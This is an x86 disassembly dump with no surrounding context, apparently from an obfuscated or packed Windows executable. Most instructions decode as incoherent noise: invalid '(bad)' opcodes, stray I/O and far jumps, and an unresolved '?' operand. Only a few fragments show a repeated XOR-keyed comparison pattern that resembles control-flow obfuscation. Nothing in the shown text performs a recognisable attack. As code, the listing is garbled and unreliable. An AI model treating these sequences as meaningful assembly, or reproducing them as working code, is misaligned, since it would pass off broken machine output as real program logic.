  40b5f3:	outs   dx,BYTE PTR ds:[esi]
  40b5f4:	xchg   edx,eax
  40b5f5:	into   
  40b5f6:	sbb    edi,ebp
  40b5f8:	pop    ds
  40b5f9:	loopne 0x40b623
  40b5fb:	push   esp
  40b5fc:	lds    edx,FWORD PTR [eax+ebp*8-0x524bfeb2]
  40b603:	pushf  
  40b604:	mov    ebx,0xfe27c4bf
  40b609:	and    BYTE PTR [esi+0x5a914418],dh
  40b60f:	sub    BYTE PTR [esp+ebx*4-0x35],cl
  40b613:	ds cmp eax,0x23ecc5c5
  40b619:	addr16 retf 0xd17e
  40b61d:	lahf   
  40b61e:	test   ax,0x8cfc
  40b622:	sahf   
  40b623:	adc    DWORD PTR [edi],ebx
  40b625:	sub    DWORD PTR [eax-0x18e5314c],ebx
  40b62b:	adc    ebx,DWORD PTR fs:[ebp+ecx*1-0x2f]
  40b630:	add    edx,ebp
  40b632:	and    al,0x3c
  40b634:	inc    edx
  40b635:	ss inc ebx
  40b637:	sti    
  40b638:	inc    ecx
  40b639:	push   edx
  40b63a:	adc    ah,BYTE PTR [edi+0x54]
  40b63d:	call   DWORD PTR [esi]
  40b63f:	shl    ah,cl
  40b641:	push   es
  40b642:	popf   
  40b643:	les    edi,FWORD PTR [eax-0x174a01d5]
  40b649:	call   DWORD PTR [ecx+0x26]
  40b64c:	(bad)
  40b64f:	jl     0x40b62a
  40b651:	mov    ah,0xb1
  40b653:	mov    ecx,0xf18f46d2
  40b658:	das    
  40b659:	mov    eax,ds:0x4237c0f9
  40b65e:	outs   dx,DWORD PTR ds:[esi]
  40b65f:	jae    0x40b667
  40b661:	sub    eax,0x4c780f6f
  40b666:	popf   
  40b667:	int    0x7e
  40b669:	dec    ebx
  40b66a:	std    
  40b66b:	push   ebp
  40b66c:	stos   BYTE PTR es:[edi],al
  40b66d:	idiv   esp
  40b66f:	pop    ds
  40b670:	fprem1 
  40b672:	leave  
  40b673:	stc    
  40b674:	(bad)  
  40b675:	fisub  WORD PTR [ecx]
  40b677:	stc    
  40b678:	stc    
  40b679:	rcl    DWORD PTR [eax],0x82
  40b67c:	xor    cl,bh
  40b67e:	jne    0x40b6d2
  40b680:	add    al,0x4b
  40b682:	adc    eax,0x2b562c3d
  40b687:	push   eax
  40b688:	pop    ebx
  40b689:	dec    ecx
  40b68a:	mov    bl,0x1b
  40b68c:	sub    al,0xeb
  40b68e:	in     al,dx
  40b68f:	mov    dh,0x38
  40b691:	adc    BYTE PTR [ebp-0x645e65d8],dl
  40b697:	or     BYTE PTR [edi],dh
  40b699:	push   ss
  40b69a:	mov    al,0xb8
  40b69c:	scas   eax,DWORD PTR es:[edi]
  40b69d:	and    BYTE PTR [edi-0x521faa2a],ch
  40b6a3:	nop
  40b6a4:	cmp    ecx,DWORD PTR [edi+0x30d7ea42]
  40b6aa:	pop    ebp
  40b6ab:	adc    eax,0x2af3b128
  40b6b0:	jbe    0x40b659
  40b6b2:	or     al,0x89
  40b6b4:	dec    edx
  40b6b5:	daa    
  40b6b6:	pop    ecx
  40b6b7:	iret   
  40b6b8:	rol    DWORD PTR [eax],0x30
  40b6bb:	jne    0x40b6fe
  40b6bd:	inc    edx
  40b6be:	mov    bl,dl
  40b6c0:	aas    
  40b6c1:	push   eax
  40b6c2:	mov    edx,0x20a17c1a
  40b6c7:	lds    ebx,FWORD PTR [edi]
  40b6c9:	ins    BYTE PTR es:[edi],dx
  40b6ca:	imul   edx,DWORD PTR [ebx+eiz*4-0xd3115b6],0xffffffac
  40b6d2:	std    
  40b6d3:	in     eax,dx
  40b6d4:	sub    ch,bh
  40b6d6:	pop    ebx
  40b6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6d8:	sub    al,0xfc
  40b6da:	scas   al,BYTE PTR es:[edi]
  40b6db:	aad    0x48
  40b6dd:	jl     0x40b74f
  40b6df:	aam    0xb3
  40b6e1:	retf   
  40b6e2:	in     al,dx
  40b6e3:	adc    DWORD PTR [eax+0x1329fb02],eax
  40b6e9:	das    
  40b6ea:	mov    DWORD PTR [edx],ebp
  40b6ec:	das    
  40b6ed:	scas   al,BYTE PTR es:[edi]
  40b6ee:	in     eax,0x68
  40b6f0:	sbb    eax,0xd3001e8c
  40b6f5:	std    
  40b6f6:	xchg   ebp,eax
  40b6f7:	lahf   
  40b6f8:	adc    al,0xe9
  40b6fa:	nop    DWORD PTR [ebx+eiz*1-0x4c]
  40b6ff:	push   esi
  40b700:	push   es
  40b701:	leave  
  40b702:	ins    BYTE PTR es:[edi],dx
  40b703:	pusha  
  40b704:	push   ss
  40b705:	cmp    eax,0xa8b6a8f7
  40b70a:	mov    ch,0xb8
  40b70c:	mov    al,0xf3
  40b70e:	or     eax,DWORD PTR [eax+0x11c9f862]
  40b714:	les    edx,FWORD PTR [ecx+ecx*2+0x793689a7]
  40b71b:	sbb    ebx,ebp
  40b71d:	sub    ch,BYTE PTR [ebx-0xe]
  40b720:	test   bl,0xd3
  40b723:	xchg   DWORD PTR [ebp+0x49be7f],esp
  40b729:	mov    eax,0xa72b5e64
  40b72e:	(bad)  
  40b72f:	jl     0x40b72c
  40b731:	dec    edi
  40b732:	imul   edi,DWORD PTR [ecx],0x5c
  40b735:	sub    cl,BYTE PTR [ecx-0x730018e5]
  40b73b:	in     eax,dx
  40b73c:	push   eax
  40b73d:	in     eax,dx
  40b73e:	xchg   ebp,eax
  40b73f:	push   0xffffffd7
  40b741:	std    
  40b742:	dec    edi
  40b743:	mov    cs,WORD PTR [esi+0x1b9fd03a]
  40b749:	mov    esp,0x61ba4e2a
  40b74e:	nop
  40b74f:	test   BYTE PTR [eax-0x3d],cl
  40b752:	int3   
  40b753:	dec    ebp
  40b754:	mov    ecx,0xd8d57a46
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	adc    DWORD PTR ds:0xfeb21271,0x7c387e7e
  40b794:	jle    0x40b814
  40b796:	lock aad 0xcc
  40b799:	aaa    
  40b79a:	sbb    eax,0xc71e3263
  40b79f:	loop   0x40b728
  40b7a1:	call   0xcb61a01b
  40b7a6:	(bad)  
  40b7a7:	sbb    DWORD PTR [ebx],ebp
  40b7a9:	in     eax,0x91
  40b7ab:	ret    
  40b7ac:	push   edi
  40b7ad:	outs   dx,BYTE PTR ds:[esi]
  40b7ae:	lods   eax,DWORD PTR ds:[esi]
  40b7af:	ja     0x40b7a7
  40b7b1:	push   cs
  40b7b2:	and    edx,edi
  40b7b4:	cmc    
  40b7b5:	test   al,0xfb
  40b7b7:	arpl   WORD PTR [ecx+0x2f645582],di
  40b7bd:	mov    al,ds:0xb39c16a5
  40b7c2:	jecxz  0x40b817
  40b7c4:	pop    es
  40b7c5:	mov    esp,0x894f78ac
  40b7ca:	cmp    eax,0x1a79fabb
  40b7cf:	dec    esp
  40b7d0:	fcomp  DWORD PTR ss:[edi+0x5]
  40b7d4:	inc    ebp
  40b7d5:	enter  0xc0e,0x7b
  40b7d9:	cmp    BYTE PTR [eax+0x7fe70625],cl
  40b7df:	inc    edi
  40b7e0:	xor    BYTE PTR [edx],dl
  40b7e2:	push   es
  40b7e3:	push   ax
  40b7e5:	mov    bh,0xcc
  40b7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7e8:	dec    eax
  40b7e9:	(bad)  
  40b7ea:	out    dx,al
  40b7eb:	xchg   ebp,eax
  40b7ec:	sbb    dh,BYTE PTR [ecx-0x78d34bf4]
  40b7f2:	mov    dh,BYTE PTR [ebx-0x59]
  40b7f5:	mov    edi,0x325addde
  40b7fa:	pop    edx
  40b7fb:	hlt    
  40b7fc:	mov    ds:0x5b0ce960,eax
  40b801:	jl     0x40b7f7
  40b803:	pop    eax
  40b804:	sub    ebp,DWORD PTR [edi+0x2b]
  40b807:	sub    eax,0x65a9364d
  40b80c:	push   eax
  40b80d:	pop    eax
  40b80e:	push   esp
  40b80f:	je     0x40b7dd
  40b811:	js     0x40b880
  40b813:	aas    
  40b814:	mov    ebp,DWORD PTR [ebp+0x3d]
  40b817:	fucomi st,st(6)
  40b819:	popf   
  40b81a:	push   esi
  40b81b:	push   ds
  40b81c:	pop    ecx
  40b81d:	outs   dx,BYTE PTR ds:[esi]
  40b81e:	mov    al,0x38
  40b820:	fidivr DWORD PTR [edx-0x41]
  40b823:	gs mov ah,0x8f
  40b826:	imul   eax,DWORD PTR [edi-0x5],0x8
  40b82a:	fs and eax,0x5bd6c36f
  40b830:	sar    DWORD PTR [edx+0x344fa37a],0xac
  40b837:	jno    0x40b7f3
  40b839:	sub    eax,0x7d50cbdf
  40b83e:	xor    ebx,ecx
  40b840:	add    al,0x77
  40b842:	jns    0x40b825
  40b844:	jo     0x40b822
  40b846:	xchg   ebp,eax
  40b847:	pop    esi
  40b848:	jno    0x40b819
  40b84a:	(bad)  
  40b84b:	dec    edi
  40b84c:	cmp    bh,BYTE PTR [eax+0x28]
  40b84f:	sub    BYTE PTR [eax+0x4404b628],dh
  40b855:	cmp    DWORD PTR [edx],0x2a8bf29c
  40b85b:	ret    
  40b85c:	aad    0xbb
  40b85e:	sahf   
  40b85f:	cmc    
  40b860:	arpl   WORD PTR [edi],si
  40b862:	(bad)  
  40b863:	mov    cl,0xc9
  40b865:	shl    DWORD PTR [ebp-0x70],0x0
  40b869:	jns    0x40b84a
  40b86b:	push   0xffffffba
  40b86d:	sbb    DWORD PTR [eax-0x19c6e40d],edi
  40b873:	lods   eax,DWORD PTR ds:[esi]
  40b874:	sbb    cl,BYTE PTR [esi-0x7b]
  40b877:	inc    BYTE PTR [edx+0x10]
  40b87a:	jmp    0x40b847
  40b87c:	out    0x4f,eax
  40b87e:	mov    WORD PTR [ebx+0x51],fs
  40b881:	xlat   BYTE PTR ds:[ebx]
  40b882:	(bad)  
  40b883:	adc    BYTE PTR [eax+0x23a0d68],bl
  40b889:	bound  ecx,QWORD PTR [ebx-0x398e1c09]
  40b88f:	mov    bh,0xd2
  40b891:	push   ds
  40b892:	and    al,0xa6
  40b894:	sub    DWORD PTR [esi-0x27],edx
  40b897:	dec    ecx
  40b898:	gs (bad) 
  40b89a:	jmp    0x22ea:0xc594c0a0
  40b8a1:	sbb    ebx,esp
  40b8a3:	test   DWORD PTR [edx],edx
  40b8a5:	push   es
  40b8a6:	dec    edx
  40b8a7:	sub    al,0x1d
  40b8a9:	xor    al,0xeb
  40b8ab:	xlat   BYTE PTR ds:[ebx]
  40b8ac:	jns    0x40b887
  40b8ae:	mov    cl,0x5e
  40b8b0:	fsubr  DWORD PTR [ecx]
  40b8b2:	sub    al,0x7f
  40b8b4:	(bad)  
  40b8b5:	fisub  DWORD PTR [eax+0x2ebe4267]
  40b8bb:	cmp    DWORD PTR [edi-0x3ec01390],0x13
  40b8c2:	mov    dl,0x1d
  40b8c4:	jae    0x40b8e2
  40b8c6:	sbb    BYTE PTR [ecx+0x11113ad9],ch
  40b8cc:	gs dec edx
  40b8ce:	jge    0x40b8da
  40b8d0:	mov    BYTE PTR [eax+0x5fd62d16],dh
  40b8d6:	mov    eax,0x6453eaee
  40b8db:	inc    ebx
  40b8dc:	aaa    
  40b8dd:	xchg   BYTE PTR [ebp-0xd],al
  40b8e0:	jae    0x40b90b
  40b8e2:	cmp    BYTE PTR [ebp+0xb],ah
  40b8e5:	mov    edx,0x1638f8a1
  40b8ea:	add    DWORD PTR [ebx-0x5d],ebx
  40b8ed:	ficomp DWORD PTR [edx]
  40b8ef:	push   ds
  40b8f0:	rol    BYTE PTR [esi-0x2f],1
  40b8f3:	mov    BYTE PTR [ebx+eax*1],0xfd
  40b8f7:	in     eax,0xd1
  40b8f9:	xchg   ecx,eax
  40b8fa:	hlt    
  40b8fb:	xchg   ebx,eax
  40b8fc:	adc    dl,BYTE PTR [ebx-0x7c63e283]
  40b902:	neg    cl
  40b904:	add    DWORD PTR [ebx+0x2],0xf
  40b908:	jns    0x40b91d
  40b90a:	or     ecx,0x7a
  40b90d:	ins    BYTE PTR es:[edi],dx
  40b90e:	pop    edx
  40b90f:	inc    esp
  40b910:	jmp    0x40b977
  40b912:	les    ebp,FWORD PTR [eax-0x64]
  40b915:	mov    al,0x8d
  40b917:	cmc    
  40b918:	or     bl,BYTE PTR [esi-0x27]
  40b91b:	jl     0x40b929
  40b91d:	js     0x40b8d3
  40b91f:	cmp    BYTE PTR [esi+0x351ad2b0],bl
  40b925:	js     0x40b96d
  40b927:	xchg   esi,eax
  40b928:	jns    0x40b91d
  40b92a:	in     al,0x27
  40b92c:	cmp    DWORD PTR [ebx+0x2a],0x78040c14
  40b933:	sbb    al,0x89
  40b935:	adc    eax,0x8fe84b0b
  40b93a:	xchg   ebx,eax
  40b93b:	imul   ebx,edx,0x3e
  40b93e:	or     esi,DWORD PTR [eax]
  40b940:	mov    ch,0x47
  40b942:	fnstcw WORD PTR [eax-0x2b]
  40b945:	imul   ebp,DWORD PTR [edi],0xd3bdff56
  40b94b:	stos   BYTE PTR es:[edi],al
  40b94c:	push   ds
  40b94d:	sub    edi,DWORD PTR [ecx-0x72]
  40b950:	jns    0x40b9b9
  40b952:	test   eax,0x90fe14f4
  40b957:	add    bl,BYTE PTR [ebp-0x57]
  40b95a:	popf   
  40b95b:	sub    BYTE PTR [edi-0x67d6269d],cl
  40b961:	ins    BYTE PTR es:[edi],dx
  40b962:	cmp    bl,BYTE PTR [ecx+0x598dc247]
  40b968:	(bad)  
  40b969:	fimul  WORD PTR [esi+0x66a0cd55]
  40b96f:	fimul  WORD PTR [ebp+0x462b921a]
  40b975:	dec    ecx
  40b976:	mov    ch,0xe0
  40b978:	ja     0x40b9ac
  40b97a:	dec    eax
  40b97b:	push   0xc2946d08
  40b980:	in     eax,dx
  40b981:	gs shr bl,0x5
  40b985:	inc    edi
  40b986:	pop    ecx
  40b987:	test   DWORD PTR [ebx+0x16d476d3],edi
  40b98d:	fdivr  DWORD PTR [edx]
  40b98f:	pop    ss
  40b990:	(bad)  
  40b991:	xchg   esi,eax
  40b992:	scas   al,BYTE PTR es:[edi]
  40b993:	inc    esp
  40b994:	test   eax,esp
  40b996:	inc    esi
  40b997:	fidivr DWORD PTR [edi]
  40b999:	or     DWORD PTR [edx-0x5b0ce09],ebx
  40b99f:	hlt    
  40b9a0:	mov    bh,0xe5
  40b9a2:	scas   eax,DWORD PTR es:[edi]
  40b9a3:	daa    
  40b9a4:	rcr    BYTE PTR [ebp+edx*4+0x25c30483],0xbd
  40b9ac:	cmp    cl,bl
  40b9ae:	fnstcw WORD PTR [si]
  40b9b1:	sbb    BYTE PTR [ecx+0x61eb697],dl
  40b9b7:	mov    BYTE PTR [edx-0x5c39e77c],bl
  40b9bd:	xchg   DWORD PTR [esi],esp
  40b9bf:	cmc    
  40b9c0:	ss jbe 0x40b973
  40b9c3:	aaa    
  40b9c4:	dec    esi
  40b9c5:	push   eax
  40b9c6:	scas   eax,DWORD PTR es:[edi]
  40b9c7:	test   BYTE PTR [ecx+eax*8+0x2],bl
  40b9cb:	push   esi
  40b9cc:	rcl    BYTE PTR [ebx-0x26],0x2f
  40b9d0:	push   edi
  40b9d1:	lods   eax,DWORD PTR ds:[esi]
  40b9d2:	out    0x36,eax
  40b9d4:	pop    es
  40b9d5:	cs and eax,0x763ff45e
  40b9db:	in     eax,0x8b
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x6028a808],eax
  40ba0f:	cmp    esp,DWORD PTR [edi+0x7e7efd7c]
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	jne    0x40ba8b
  40ba1b:	fwait
  40ba1c:	int3   
  40ba1d:	out    0x43,al
  40ba1f:	aas    
  40ba20:	dec    edx
  40ba21:	pop    es
  40ba22:	fnstenv [eax]
  40ba24:	sub    eax,0x4b355717
  40ba29:	dec    esi
  40ba2a:	adc    ch,0xa1
  40ba2d:	call   0x42909bec
  40ba32:	(bad)  
  40ba34:	inc    esi
  40ba35:	jo     0x40ba74
  40ba37:	pop    ss
  40ba38:	sar    BYTE PTR [edi+0x2de34e86],1
  40ba3e:	jns    0x40ba7d
  40ba40:	in     eax,dx
  40ba41:	hlt    
  40ba42:	aad    0xe6
  40ba44:	cmp    ebx,DWORD PTR ds:0x75cea64
  40ba4a:	scas   eax,DWORD PTR es:[edi]
  40ba4b:	mov    DWORD PTR [edx+0xf],eax
  40ba4e:	jns    0x40ba31
  40ba50:	nop
  40ba51:	dec    edi
  40ba52:	sub    al,0xc4
  40ba54:	je     0x40ba51
  40ba56:	retf   0xae6e
  40ba59:	cmp    DWORD PTR [eax],0xbd8e02fa
  40ba5f:	jnp    0x40ba30
  40ba61:	inc    edx
  40ba62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba63:	not    BYTE PTR [ebx-0x6017271a]
  40ba69:	call   0x203090d4
  40ba6e:	frstor [edx-0x72]
  40ba71:	shl    esi,0xa0
  40ba74:	outs   dx,BYTE PTR ds:[esi]
  40ba75:	mov    bl,0x97
  40ba77:	shl    DWORD PTR [eax+0x70],cl
  40ba7a:	cmp    al,0x26
  40ba7c:	leave  
  40ba7d:	and    ch,BYTE PTR [eax+0x598eb71d]
  40ba83:	outs   dx,BYTE PTR ds:[esi]
  40ba84:	inc    ecx
  40ba85:	mov    ds:0xf327d100,eax
  40ba8a:	jmp    0x111c:0x97f24fcb
  40ba91:	cdq    
  40ba92:	icebp  
  40ba93:	cmp    BYTE PTR [edx+0x157231e1],0x9a
  40ba9a:	xor    DWORD PTR [eax-0x3d37216d],esi
  40baa0:	jo     0x40ba2c
  40baa2:	sub    dh,BYTE PTR [ebp-0x3257003a]
  40baa8:	cs icebp 
  40baaa:	fsub   st,st(4)
  40baac:	fadd   QWORD PTR [eax]
  40baae:	jb     0x40ba6f
  40bab0:	retf   0x5f84
  40bab3:	xchg   esi,eax
  40bab4:	or     BYTE PTR [ebx-0x3566cdcd],al
  40baba:	loopne 0x40baf2
  40babc:	fbstp  TBYTE PTR [ecx]
  40babe:	mov    bl,0x4c
  40bac0:	enter  0xcdae,0xbe
  40bac4:	push   0xe20a72cc
  40bac9:	jmp    0x180a:0x9aface75
  40bad0:	dec    ecx
  40bad1:	and    eax,0xc1ae144
  40bad6:	pop    eax
  40bad7:	mov    cl,0x59
  40bad9:	(bad)  
  40bada:	mov    al,ds:0xcac64c59
  40badf:	jge    0x40bb2b
  40bae1:	xor    eax,esp
  40bae3:	push   esi
  40bae4:	add    dh,ch
  40bae6:	iret   
  40bae7:	clc    
  40bae8:	ins    DWORD PTR es:[edi],dx
  40bae9:	and    al,0xcd
  40baeb:	jae    0x40bb59
  40baed:	test   al,0x7d
  40baef:	aam    0xfe
  40baf1:	mov    ebx,0xccd51c9b
  40baf6:	lods   al,BYTE PTR ds:[esi]
  40baf7:	fstp   DWORD PTR [edi+eiz*8+0x33]
  40bafb:	inc    DWORD PTR ds:0xa67194fc
  40bb01:	shl    al,0x2
  40bb04:	or     BYTE PTR [eax],bl
  40bb06:	jns    0x40badf
  40bb08:	ret    0x451d
  40bb0b:	hlt    
  40bb0c:	ins    DWORD PTR es:[edi],dx
  40bb0d:	lock inc ebp
  40bb0f:	cdq    
  40bb10:	cmp    DWORD PTR [eax],edi
  40bb12:	mov    ebx,0x289dc8bd
  40bb17:	pushf  
  40bb18:	es (bad) 
  40bb1a:	mov    dh,0xda
  40bb1c:	xchg   esi,eax
  40bb1d:	adc    ch,dl
  40bb1f:	adc    eax,0x95e49dcf
  40bb24:	cwde   
  40bb25:	arpl   sp,dx
  40bb27:	ds xchg ebx,eax
  40bb29:	imul   eax,DWORD PTR [ebx],0x9267d2e2
  40bb2f:	out    dx,eax
  40bb30:	nop
  40bb31:	xchg   esi,eax
  40bb32:	test   BYTE PTR [edx+0x2cf38280],0xc7
  40bb39:	ja     0x40bb70
  40bb3b:	int3   
  40bb3c:	push   ds
  40bb3d:	jmp    0x40bb6c
  40bb3f:	fistp  QWORD PTR [ebp+0x1f]
  40bb42:	ss call 0xfd8b:0xaa66ec2a
  40bb4a:	jle    0x40bb2d
  40bb4c:	rol    bh,cl
  40bb4e:	push   ebp
  40bb4f:	test   DWORD PTR [ebp-0x3c],ebx
  40bb52:	(bad)
  40bb55:	adc    dh,ch
  40bb57:	jne    0x40bb5b
  40bb59:	mov    ebx,0x3f75b33d
  40bb5e:	jmp    0xf3eb5c7c
  40bb63:	mov    ah,0x96
  40bb65:	lahf   
  40bb66:	push   eax
  40bb67:	rcl    BYTE PTR [esi],0x7a
  40bb6a:	pusha  
  40bb6b:	pmaxsw mm4,QWORD PTR [ecx]
  40bb6e:	adc    esi,DWORD PTR [ebp+eiz*2-0x335810d7]
  40bb75:	popa   
  40bb76:	add    cl,BYTE PTR [ecx-0x7e]
  40bb79:	cdq    
  40bb7a:	setae  ch
  40bb7d:	mov    ah,0x14
  40bb7f:	retf   
  40bb80:	jo     0x40bb84
  40bb82:	jmp    0xe8de8aa4
  40bb87:	mov    dl,0x1e
  40bb89:	dec    esp
  40bb8a:	(bad)  [edx+0x62]
  40bb8d:	fcomi  st,st(7)
  40bb8f:	shr    BYTE PTR [edx],0xb7
  40bb92:	cld    
  40bb93:	jb     0x40bb80
  40bb95:	(bad)  
  40bb96:	jl     0x40bc08
  40bb98:	add    edi,DWORD PTR ds:0x754f70c1
  40bb9e:	mov    bl,0x67
  40bba0:	push   ss
  40bba1:	add    al,0xdd
  40bba3:	adc    eax,0x46584edb
  40bba8:	test   DWORD PTR [ecx+ebx*1-0x11],edx
  40bbac:	jl     0x40bbcb
  40bbae:	add    edi,0x787b4c32
  40bbb4:	cwde   
  40bbb5:	shr    edi,1
  40bbb7:	mov    ds,esp
  40bbb9:	mov    ds:0xba26db7c,eax
  40bbbe:	mov    al,ds:0xb1c83cee
  40bbc3:	sbb    ecx,DWORD PTR [eax-0x5a]
  40bbc6:	ret    0xb775
  40bbc9:	and    BYTE PTR [edx],al
  40bbcb:	dec    esp
  40bbcc:	pop    ebp
  40bbcd:	adc    esp,edi
  40bbcf:	add    eax,0x8769c65a
  40bbd4:	mov    BYTE PTR [ecx+0x31],al
  40bbd7:	xchg   edi,eax
  40bbd8:	pop    es
  40bbd9:	cmp    BYTE PTR ds:0x5df84dbd,al
  40bbdf:	(bad)  
  40bbe0:	jb     0x40bbd4
  40bbe2:	adc    edi,esi
  40bbe4:	jbe    0x40bb76
  40bbe6:	and    eax,0x16316c5
  40bbeb:	jge    0x40bc5a
  40bbed:	and    al,0x37
  40bbef:	sub    al,0x33
  40bbf1:	mov    edi,0x3e68c26c
  40bbf6:	jle    0x40bbc5
  40bbf8:	iret   
  40bbf9:	out    0xd8,al
  40bbfb:	nop
  40bbfc:	nop
  40bbfd:	gs repz lea ebp,gs:[eax+0xa]
  40bc03:	(bad)
  40bc06:	daa    
  40bc07:	lods   al,BYTE PTR ds:[esi]
  40bc08:	push   ss
  40bc09:	jmp    0x40bc46
  40bc0b:	xchg   ebx,eax
  40bc0c:	sysret 
  40bc0e:	aas    
  40bc0f:	fisubr WORD PTR [edi]
  40bc11:	xor    BYTE PTR [edi+0x10481e86],bl
  40bc17:	pop    edx
  40bc18:	pop    ecx
  40bc19:	adc    ebx,DWORD PTR [ecx]
  40bc1b:	cmp    eax,0x47d19e2f
  40bc20:	fdivr  DWORD PTR ds:0xf0b5cb25
  40bc26:	call   0xb5626491
  40bc2b:	add    DWORD PTR [ecx-0x3a],eax
  40bc2e:	mov    bl,0xdf
  40bc30:	push   0x24
  40bc32:	dec    esp
  40bc33:	jne    0x40bca8
  40bc35:	and    ah,al
  40bc37:	mov    edi,0x9ba7278e
  40bc3c:	retf   
  40bc3d:	cmp    BYTE PTR [eax],cl
  40bc3f:	add    DWORD PTR [edx+0x9],esp
  40bc42:	and    al,0x34
  40bc44:	div    DWORD PTR [esi+0x64]
  40bc47:	sub    eax,0x83f52159
  40bc4c:	and    eax,ecx
  40bc4e:	int    0xd3
  40bc50:	cmp    al,0x7f
  40bc52:	xchg   ebp,eax
  40bc53:	inc    ebx
  40bc54:	push   edi
  40bc55:	xlat   BYTE PTR ds:[ebx]
  40bc56:	bound  edi,QWORD PTR ss:[esp+edx*2-0x68]
  40bc5b:	xor    bl,BYTE PTR [ebx-0x48f0030f]
  40bc61:	add    al,0x78
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	jle    0x40bd01
  40bc97:	dec    eax
  40bc98:	inc    esp
  40bc99:	(bad)  
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	or     DWORD PTR [ecx+0x3a],esi
  40bca4:	xchg   ecx,eax
  40bca5:	loopne 0x40bcce
  40bca7:	pop    esi
  40bca8:	mov    ds:0x16e3d7f0,al
  40bcad:	push   ds
  40bcae:	add    eax,0x62316f06
  40bcb3:	test   ebp,0xf108d6eb
  40bcb9:	rcl    DWORD PTR [esi+0x100d9f82],1
  40bcbf:	out    0x3f,al
  40bcc1:	or     al,0x1f
  40bcc3:	dec    ecx
  40bcc4:	ficomp DWORD PTR [edx+0x75ccc2e7]
  40bcca:	jb     0x40bc9d
  40bccc:	inc    ebx
  40bccd:	mov    esi,DWORD PTR [edi]
  40bccf:	fdiv   st,st(7)
  40bcd1:	pop    esi
  40bcd2:	fstp   DWORD PTR [ebp+0x51]
  40bcd5:	inc    ecx
  40bcd6:	dec    esi
  40bcd7:	mov    ebx,0xb0815e71
  40bcdc:	pop    esp
  40bcdd:	test   DWORD PTR [esi-0x1c],esi
  40bce0:	ss ja  0x40bccb
  40bce3:	fwait
  40bce4:	std    
  40bce5:	jbe    0x40bc9f
  40bce7:	cmp    edx,DWORD PTR [edx+0x63]
  40bcea:	push   edi
  40bceb:	sub    bh,dl
  40bced:	ja     0x40bd2b
  40bcef:	ficom  WORD PTR [ecx]
  40bcf1:	imul   ebp,ecx,0xa0dba6fa
  40bcf7:	dec    ebx
  40bcf8:	sub    esp,DWORD PTR [ebx]
  40bcfa:	xchg   DWORD PTR [eax+0x24],eax
  40bcfd:	mov    WORD PTR [esi+0x2b],?
  40bd00:	fnstsw WORD PTR [ecx+0x78be90cc]
  40bd06:	jle    0x40bce3
  40bd08:	pop    edx
  40bd09:	sub    eax,0x32a3ae7a
  40bd0e:	sbb    bl,BYTE PTR ds:0x6121886a
  40bd14:	call   0x3652:0xcc74d839
  40bd1b:	add    DWORD PTR [ebx+edi*8-0x5a],esi
  40bd1f:	leave  
  40bd20:	xchg   ebp,eax
  40bd21:	out    0x1,eax
  40bd23:	(bad)  
  40bd24:	loopne 0x40bccd
  40bd26:	fdivr  DWORD PTR [ebx-0x7906183]
  40bd2c:	data16 ja 0x40bd6f
  40bd2f:	idiv   DWORD PTR [ebp+0x39]
  40bd32:	cld    
  40bd33:	or     BYTE PTR [edi+eax*1+0x3e81bcf3],dl
  40bd3a:	sub    eax,DWORD PTR [esi]
  40bd3c:	cmc    
  40bd3d:	pop    edi
  40bd3e:	sbb    al,0x10
  40bd40:	in     al,dx
  40bd41:	addr16 pushf 
  40bd43:	cdq    
  40bd44:	(bad)  
  40bd45:	fs ret 
  40bd47:	mov    ecx,0xee0c5174
  40bd4c:	sub    esi,DWORD PTR [ebx+edx*1-0x42308d44]
  40bd53:	fild   WORD PTR [eax-0x72]
  40bd56:	ret    
  40bd57:	inc    ebp
  40bd58:	or     eax,0x2b849cd5
  40bd5d:	aas    
  40bd5e:	clc    
  40bd5f:	in     eax,dx
  40bd60:	push   es
  40bd61:	ret    
  40bd62:	mov    esi,0xd4b4fbba
  40bd67:	adc    ch,0xa9
  40bd6a:	ins    BYTE PTR es:[edi],dx
  40bd6b:	cld    
  40bd6c:	xor    cl,0x39
  40bd6f:	in     al,0x8b
  40bd71:	or     al,0xe4
  40bd73:	push   cs
  40bd74:	mov    ds:0x55b9d1e9,al
  40bd79:	dec    ebp
  40bd7a:	sar    ebp,cl
  40bd7c:	iret   
